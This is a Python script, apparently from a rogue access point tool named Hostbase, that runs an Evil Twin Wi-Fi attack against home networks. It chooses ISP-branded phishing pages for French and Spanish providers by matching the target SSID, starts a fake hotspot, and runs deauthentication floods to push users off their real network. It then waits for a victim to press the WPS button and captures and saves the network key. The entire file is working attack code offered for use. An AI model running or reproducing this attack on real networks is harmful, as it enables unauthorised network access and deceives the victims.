import os
import re
import time
import subprocess
import sys
import signal
from signal import SIGINT, SIGTERM, sigwait
from pathlib import Path

# Script working with python >= 3.10

YELLOW = "\033[33m"
RED = "\033[31m"
GREEN = "\033[32m"
BLUE = "\033[34m"
CYAN = "\033[36m"
MAGENTA = "\033[35m"
RESET = "\033[0m"




with open("hostapdcarte", "r") as ct:
 carte = ct.read()
with open("ssid.txt", "r") as es:
 ssid = es.read()


print(f"{RESET}Configuring hostapd...")
# berate.rb ici ?  ruby à mettre dans l'install et highline en gem
vieuxscript = subprocess.Popen("bash berate.sh", shell=True)  # passage en bash ici car problème avec les sondes NCSI et le code en python

with open('page', 'r') as p:
 pageflag = p.read()

 if '0' in pageflag:
     print(f"{YELLOW}WPA flag detected : will serve a wpa phishing page using QR code")
     flag = 'wpa3'
 else:
     print(f"{YELLOW}WPS flag detected : will serve a wps phishing page asking to push wps button")
     flag = 'wps'
     os.system("cp -R WebPages/wpa_supplicant.conf .")


print(f"{RESET}Finding the fishing page...")
if 'MiFibra' in ssid:
  print('Configuring the hotspot...')
elif 'miF' in ssid:
  print('Configuring the hotspot...')
elif 'mif' in ssid:
  print('Configuring the hotspot...')
elif 'MOVISTAR' in ssid:
  print('Configuring the hotspot...')
elif 'mov' in ssid:
  print('Configuring the hotspot...')
elif 'Mov' in ssid:
  print('Configuring the hotspot...')
elif 'vodafone' in ssid:
  print('Configuring the hotspot...')
elif 'Voda' in ssid:
  print('Configuring the hotspot...')
elif 'Livebox' in ssid:
  print('Configuring the hotspot...')
  print('livebox' + flag)
  page = 'livebox' + flag
  with open('page.txt', 'w') as f:
      f.write("livebox" + flag)
  print(page)
elif 'livebox' in ssid:
  print('Configuring the hotspot...')
  print('livebox' + flag)
  page = 'livebox' + flag
  with open('page.txt', 'w') as f:
      f.write("livebox" + flag)
elif 'LIVEBOX' in ssid:
  print('Configuring the hotspot...')
  print('livebox' + flag)
  page = 'livebox' + flag
  with open('page.txt', 'w') as f:
      f.write("livebox" + flag)
elif 'Orange' in ssid:
  print('Configuring the hotspot...')
elif 'orange' in ssid:
  print('Configuring the hotspot...')
elif 'ONO' in ssid:
  print('Configuring the hotspot...')
elif 'OnO' in ssid:
  print('Configuring the hotspot...')
elif 'ono' in ssid:
  print('Configuring the hotspot...')
elif 'jazztel' in ssid:
  print('Configuring the hotspot...')
elif 'Jazztel' in ssid:
  print('Configuring the hotspot...')
elif 'JazzTel' in ssid:
  print('Configuring the hotspot...')
elif 'mif' in ssid:
     print('Configuring the hotspot...')
elif 'SFR' in ssid:
     print('Configuring the hotspot...')
     print('sfr' + flag)
     page = 'sfr' + flag
     with open('page.txt', 'w') as f:
         f.write("sfr" + flag)
elif 'Sfr' in ssid:
     print('Configuring the hotspot...')
     print('sfr' + flag)
     page = 'sfr' + flag
     with open('page.txt', 'w') as f:
         f.write("sfr" + flag)
elif 'sfr' in ssid:
     print('Configuring the hotspot...')
     print('sfr' + flag)
     page = 'sfr' + flag
     with open('page.txt', 'w') as f:
         f.write("sfr" + flag)
elif 'Bbox' in ssid:
     print('Configuring the hotspot...')
     print('bbox' + flag)
     page = 'bbox' + flag
     with open('page.txt', 'w') as f:
         f.write("bbox" + flag)
elif 'bbox' in ssid:
     print('Configuring the hotspot...')
     print('bbox' + flag)
     page = 'bbox' + flag
     with open('page.txt', 'w') as f:
         f.write("bbox" + flag)
elif 'BBOX' in ssid:
     print('Configuring the hotspot...')
     print('bbox' + flag)
     page = 'bbox' + flag
     with open('page.txt', 'w') as f:
         f.write("bbox" + flag)
elif 'Free' in ssid:
     print('Configuring the hotspot... ATTENTION : free utilise pas le WPS par défaut, page employée --> freewpa3 (avec le code QR)')
     flag = 'wpa3'
     page = 'free' + flag
     with open('page.txt', 'w') as f:
         f.write("free" + flag)
elif 'free' in ssid:
     print('Configuring the hotspot... ATTENTION : free utilise pas le WPS par défaut, page employée --> freewpa3 (avec le code QR)')
     flag = 'wpa3'
     page = 'free' + flag
     with open('page.txt', 'w') as f:
         f.write("free" + flag)
elif 'FREE' in ssid:
     print('Configuring the hotspot... ATTENTION : free utilise pas le WPS par défaut, page employée --> freewpa3 (avec le code QR)')
     flag = 'wpa3'
     page = 'free' + flag
     with open('page.txt', 'w') as f:
         f.write("free" + flag)
else:
     print(f"{RED}Error occured when detecting the phishing page...")
     print(f"{YELLOW}Don't worry : 404 page will be used as default phishing page...")
     print(f"{CYAN}This error means that you try to use Hostbase in a country wich not include the french phishing pages...")
     print(f"{MAGENTA}...OR... this error maybe means that the name of the target network is not the same as the most knowed ISP's in french or spanish country... ")
     print(f"{GREEN}Anyway... 404 page will be used as default phishing page.")
     print(f"{GREEN}Following process... some errors will appear in this shell due to this procedure but they are false positive...")
     print(f"{RESET}404 selected...")
     page = '404'
     flag = 'wpa3'
     with open('page.txt', 'w') as f:
         f.write("404" + flag)





# Reste à faire :
# Copie des fake pages + droits sur le serveur apache
# iptables + dhcpd + dnspoof  (pas utile si utilisation de berate_ap
# Deauth
# Attente WPS + attente clé
# Affichage à l'écran des deux


time.sleep(50)  # Attente que le hotspot soit lancé dans berate.rb avant de balancer la deauth
if flag == 'wpa3':
    print('wpa3 mode')
else:
    print('wps mode')

# Lancement de la deauth en 2.4Ghz ou 5GHz en meme temps selon la conf détectée (mettre dans un thread ou subprocess)

ghz = 0

if os.path.isfile('cinqgcarte'):
   with open("cinqgcarte", "r") as c:
        cinq = c.read()

   with open("deuxgcarte", "r") as d:
        deux = d.read()
   print("Starting monitor mode on the wifi cards...")
   os.system("rfkill unblock all")
   os.system("ip link set" + " " + cinq + " " + "down")
   os.system("iw dev" + " " + cinq + " " + "set type monitor")
   time.sleep(3)
   os.system("ip link set" + " " + cinq + " " + "up")
   time.sleep(3)
   os.system("ip link set" + " " + deux + " " + "down")
   os.system("iw dev" + " " + deux + " " + "set type monitor")
   time.sleep(3)
   os.system("ip link set" + " " + deux + " " + "up")
   time.sleep(3)
   print("Starting deauth the target network on both frequencies... (2.4GHz/5GHz)")
   os.system("wmctrl -r :ACTIVE: -b remove,fullscreen")
   dos = subprocess.Popen("python rundos.py", shell=True)
   time.sleep(1)
   ghzdos = subprocess.Popen("python rundoscinqg.py", shell=True)
   print("Starting wash...")
   wash = subprocess.Popen("python wash.py", shell=True)
   time.sleep(1)
   ghz = 1
else:
    print("Starting monitor mode on the other card...")
    with open("deuxgcarte", "r") as d:
        deux = d.read()
    os.system("ip link set" + " " + deux + " " + "down")
    os.system("iw dev" + " " + deux + " " + "set type monitor")
    time.sleep(3)
    os.system("ip link set" + " " + deux + " " + "up")
    time.sleep(3)
    os.system("wmctrl -r :ACTIVE: -b remove,fullscreen")
    print('Starting deauth the target network on 2.4GHz frequency...')
    dos = subprocess.Popen("python rundos.py", shell=True)
    print("Starting wash...")
    wash = subprocess.Popen("python wash.py", shell=True)
    time.sleep(1)

if flag == 'wpa3':
    wash.terminate()
    wash.send_signal(subprocess.signal.SIGTERM)
    os.system("killall wash")
    cle = subprocess.Popen("python attack4.py", shell=True)
else:
 print(f"{CYAN}Waiting for users... ctrl+c to leave...")
while not os.path.exists('wash.txt'):
    time.sleep(1)

if os.path.isfile('wash.txt'):
    print('')
else:
    raise ValueError("%s isn't a file!" % 'wash.txt')
while True:
    if 'wps_selected_registrar' in open("wash.txt").read():
        break
    time.sleep(1)
else:
    raise ValueError("%s isn't a file!" % file_path)

print(f"{GREEN}User has connected to the fake AP and pushed the WPS button...")
print(f"{RESET}Stopping the deauth attack...")
wash.terminate()
wash.send_signal(subprocess.signal.SIGTERM)
os.system("killall wash")
dos.terminate()
dos.send_signal(subprocess.signal.SIGTERM)
if ghz == 1:
    ghzdos.terminate()
    ghzdos.send_signal(subprocess.signal.SIGTERM)
else:
    None


print('Starting wpa_cli...')
with open("bssid.txt", "r") as b:
    bssid = b.read()
os.system("ip link set" + " " + deux + " " + "down")
os.system("iw dev" + " " + deux + " " + "set type managed")
time.sleep(3)
os.system('rfkill unblock all')
os.system("ip link set" + " " + deux + " " + "up")
time.sleep(5)
os.system('killall wpa_supplicant')
os.system('rm -rf /etc/wpa_supplicant.conf')
os.system('cp -R wpa_supplicant.conf /etc/')
os.system("sudo wpa_supplicant -B -Dnl80211 -i" + deux + " " + "-c/etc/wpa_supplicant.conf")


with open("bssid.txt", "r") as b:
    bssid = b.read()

starttime = time.monotonic()
while True:
    os.system("xterm -e wpa_cli wps_pbc" + " " + bssid)
    time.sleep(20.0 - ((time.monotonic() - starttime) % 20.0))
    if 'WPA' in open("/etc/wpa_supplicant.conf").read():
        break

print(f"{GREEN}KEY FOUND !")
with open("/etc/wpa_supplicant.conf", "r") as k:
    key = k.read()
    print(key)
    print(f"{RESET}Saving the key to home folder...")
    os.system('cp -R /etc/wpa_supplicant.conf /home/')
    print("Done.")

print(f"{CYAN}Leaving Hostbase...")
exitscript = subprocess.Popen("python exit.py", shell=True)
sys.exit()
# exit de tout les process plus effacemment des fichier txt et csv, restart ne network manager



